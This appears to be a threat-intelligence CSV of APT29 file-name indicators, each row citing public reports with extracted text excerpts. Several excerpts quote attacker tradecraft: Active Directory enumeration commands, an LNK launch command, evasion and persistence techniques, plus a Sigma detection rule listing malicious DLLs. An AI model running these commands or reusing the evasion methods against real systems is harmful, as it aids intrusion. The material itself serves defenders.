schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--apt29,artifact--sha256:9725dc59d7181533df7e28632f151c30239d7f12126fb39f867755d6699f86e4,observation--sha256:736d1ad707a10eccf5a439d2e64598fee80ba491169c28d5cf4641159747afc3,file-name,7za.exe,7za.exe,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS victim’s machine. The DLL is written in C   and contains only 1 export function  DeviceAll), whichsimply returns when called. The actual malicious code is implemented in a thread that is spawned inDLLMain during the DLL’s initialization. Multiple anti-analysis and evasion techniques are usedthroughout the malware including API unhooking, dynamically resolving APIs, string encryption, andsandbox evasion. When GraphicalNeutrino starts a thread, it attempts to remove any API h",
1.0.0,actor--apt29,artifact--sha256:0af706739efc5d4a6839e59e816350754957ebab476d19f5694ee26e6527e274,observation--sha256:86b5594a2cc8bb1bf9a6c97a73981ddf0cbb3b4d5c3b1fa37a3785f80781995a,file-name,ADVAPI32.DLL,ADVAPI32.DLL,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 44}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,S2GRUPO | LAB5243 Table 6. Libraries and functions resolved by the first code block LIBRARY API KERNEL32.DLL GetProcessHeap HeapAlloc HeapFree VirtualAlloc VirtualProtect VirtualFree ExitProcess GetSystemFirmwareTable GetVersionExA ADVAPI32.DLL RegOpenKeyExA RegQueryValueExA RegCloseKey MD5Init MD5Update MD5Final USER32.DLL wsprintfA MessageBoxA OLE32.DLL CoInitialize CoInitializeSecurity CoInitializeInstance CoCreateInstance CoSetProxyBlanket CoUninitialize OLEAUT32.DLL VariantClear VariantInit,
1.0.0,actor--apt29,artifact--sha256:7bcb1cd48eaebcc2f2bec0e2a8d472fb75b4d214fa3b0bf51e5956a3366116a9,observation--sha256:f4f65c061e72eb64475f828e56e3ad3e29d5b08d88014190343e1e5293ce5614,file-name,AWS IAM Compliance Check.rdp,AWS IAM Compliance Check.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 283}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,AWS IAM Compliance Check.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:5c56729b257dbb33a5524313cc80a079cba627c1efbce912eca71665da68a8b0,observation--sha256:1245e3d16c1d0b7546d8f26ab4cb619e161ba6c95e6b735b17faada95e728fc3,file-name,AWS IAM Configuration.rdp,AWS IAM Configuration.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 284}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,AWS IAM Configuration.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:7bd8134ddf6b8231856d56e5642dd021d75f32706051f5eca3f16ebdf8d778ee,observation--sha256:7f716e076612e6077fcb636c5d5838a99f3d90d46b18a6b6527b31e20544596f,file-name,AWS IAM Quick Start.rdp,AWS IAM Quick Start.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 285}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,AWS IAM Quick Start.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:d45b9c46fde26b43ab4ff8940157fc7548db3d20286e5f9753d7c607169a2c11,observation--sha256:55249e3a949a52bc60216de1b001a0d39d2cd1026f20956b2c52b0050ff58d0b,file-name,AWS SDE Compliance Check.rdp,AWS SDE Compliance Check.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 286}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,AWS SDE Compliance Check.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:08e36aa56acdc5fe137be8a9f4580ec9929c74e9dad16322f2d6bf59d3de5206,observation--sha256:924830dbb2392907ff5a6cae5c345ac01f12f43beb71ddb9a640290be153c9af,file-name,AWS SDE Environment Check.rdp,AWS SDE Environment Check.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 287}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,AWS SDE Environment Check.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:c9a74c83581f74df638550d72b421f4815beeedcd14cf4af98b773daaed7bd82,observation--sha256:218f6f32932512c42dce322f32fd529105b5fc4d7bd09f338f46addb2b0224d7,file-name,AWS Secure Data Exchange Compliance.rdp,AWS Secure Data Exchange Compliance.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 288}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,AWS Secure Data Exchange Compliance.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:f52e17a027da73a9eb350dab63071b0f9152cf7bbf425ef9de464f033f56132b,observation--sha256:b6da1a7a7456019f866808c23251ccddd4e422b80484bf0e3604712a019aea6a,file-name,AWS Secure Data Exchange – Compliance Check.rdp,AWS Secure Data Exchange – Compliance Check.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 289}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,AWS Secure Data Exchange – Compliance Check.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:8a20780b884f7d23515a7785b21e22dff3977f75df565e970d0a6764f923a5ec,observation--sha256:83cc2d4b59742248a44568a60419e90f961a3689503beed2dda3a50c6de59060,file-name,AclNumsInvertHost.dll,AclNumsInvertHost.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:8a20780b884f7d23515a7785b21e22dff3977f75df565e970d0a6764f923a5ec,observation--sha256:f5f6ae6cdba697a28709b67b371b285fdc6282dabfcd5036f952446e7e486fd6,file-name,AclNumsInvertHost.dll,AclNumsInvertHost.dll,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:97e7f481d8aed86aa64983b984548f6c8ed831db047ab26e3ea97544568e8207,observation--sha256:d886f91ecb1ef337e7bb3ff0425cccd5e70355b874e773ca02fcb3c866e969c4,file-name,AddressResourcesSpec.dll,AddressResourcesSpec.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:ca463ba02924354a1d94252be2406b6ca11f315187ee2bb2c6d483ed3fad3f25,observation--sha256:8473951c32dc2b29d4b4abb0bdac3480cd2ff5a2275b7e47468310c3b6159e2a,file-name,Ambassador_Absense.docx,Ambassador_Absense.docx,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Executive Summary BlueBravo is a threat group tracked by Recorded Future’s Insikt Group that overlaps with the Russianadvanced persistent threat  APT  activity tracked as APT29 and NOBELIUM. APT29 and NOBELIUMoperations have beenpreviouslyattributedto Russia’sForeign Intelligence Service  SVR , anorganization responsible for foreign espionage, active measures, and electronic surveillance. In October2022 we identified BlueBravo staging GraphicalNeutrino malware within a mali",
1.0.0,actor--apt29,artifact--sha256:f048c3a687fc96d4965a86db81ff56a9ffcad0358e36d15b206b74e2361cf3be,observation--sha256:a6b1ebea0af680cb5403237478f9cc1de94ddec46946fe175ccad294012ca031,file-name,AppIsvSubsystems64.dll,AppIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Whenavictimtriestoopenanyof theLNKfiles, it triggerstheexecutionof thecommandcmd /cstart .$Recycle.Bin\windoc.exe && "".$Recycle.Bin\bmw[X].png"". Thiscommandisusedtolaunchwindoc.exeandopenaPNGfilecorrespondingtothenumber of theLNKfileopened.Windoc.exeservesastheinitial executionpoint for themalware, whilethePNGfileactsasadecoytodivert attentionawayfromthemalwareasit beginsitsexecutionwithintheWindoc.exeprocess. Windoc.exeisabenigncopyof theMicrosoft Wordapplicationthat",
1.0.0,actor--apt29,artifact--sha256:aa1af633dc17a3615d8086e820796c5395486007351a51b2c73deac2cbeafd5f,observation--sha256:b7aadf616b853c41f979321fd3b1002a8a52c8e098cd4226c53c48f57581b7ba,file-name,ApplicationFrameHost.exe,ApplicationFrameHost.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 10/20 If OPSEC checks are passed, a new thread is spawned. The new thread again executes the same OPSEC- related code blocks (initialize APIs, unhook modules, check for sleep emulation, check for proper parent name) and, if all checks are passed, loads and injects the next stage into a randomly selected process. 1. __int64 InjectThread() 2. { 3. // Reused code blocks have been simplified 4. ResolveAPIs(); 5. UnhookDLLs(); 6. CheckForSleep",
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:8fab7679adf0fcc2ff2977dd73f174d616b6c789f9e8d85f9066155669f01c9b,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA decrypt thecontentsof theXSD. Thedecryptedcontentscontainshellcodethat isthenexecutedtoextract andloadanembeddedDLL. Inadditiontotheencryptionroutine, theDLLmoduleengagesinadditional detectionevasiontechniquessuchascheckingtoensurethat it isnot runninginasandboxor under adebugger. Afterengagingintheseoperations, themoduleestablishespersistencebycopyingthecontentsof theISOfiletoadirectoryandcreatingaregistryrunkeytoexecutetheEXEduringsystemstartup.Subsequently, it decr",
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:9c7b4fdcd28a6646dfd1b339b695eb5271abcc0dee5a95878824c0c261618037,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 16/20 Appendix A – IOCs File IoCs Indicator Value Legitimate binary used for loading malicious DLL File Name Note .exe File Size 1597KB MD5 83863beee3502e42ced7e4b6dacb9eac SHA1 d9d40cb3e2fe05cf223dc0b592a592c132340042 SHA256 cb470d77087518ed7bc53ca624806c265ae2485d40ec212acc2559720940fb27 Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 0e5ed33778ee9c020aa067546384abcb SHA1 fbb482415f5312ed64b3a0ebee7fed5e66,
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:527c3c549120f5a3746f3aa1a5ba1bb567df589649ea1add0b9568ce122d27a0,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 2/20 Table of Contents Table of Contents ................................ ................................ ................................ ................................ ................................ .......... 2 Threat Summary ................................ ................................ ................................ ................................ ................................ ............ 3 Detailed Technical Analysis ,
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:30c73d25402a4b2f04a2462b95e54cb3f4a1a7f796999f7e7a91f10729d4bfc6,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/20 The adversary uses AppvIsvSubsystems64.dll import to facilitate HALFRIG execution. The following flowchart illustrates the module execution process: Figure 4 - HALFRIG execution flowchart AppvIsvSubsystems64.dll The first DLL to be loaded and executed by renamed WINWORD.EXE is AppvIsvSubsystems64.dll. This DLL simply spawns a new thread that resolves APIs and loads the next module. Figure 5 - DllMain function of the first stage of HA,
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:8a2780958e5d2da98ffe7b95578da0ae821e2125c2c8cc4c1fbf4ea1512092b1,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 8/20 The new thread resolves the required APIs, loads, and executes the next stage. Figure 6 - the main AppvIsvSubsystems64.dll routine – loads and executes the next stage All HALFRIG DLLs use the same obfuscation techniques: − Strings are encrypted and decrypted during the exec ution. Plaintext strings are not re - encrypted or deleted after use. − To facilitate dynamic API resolving, HALFRIG utilizes a custom structure that stores modul",
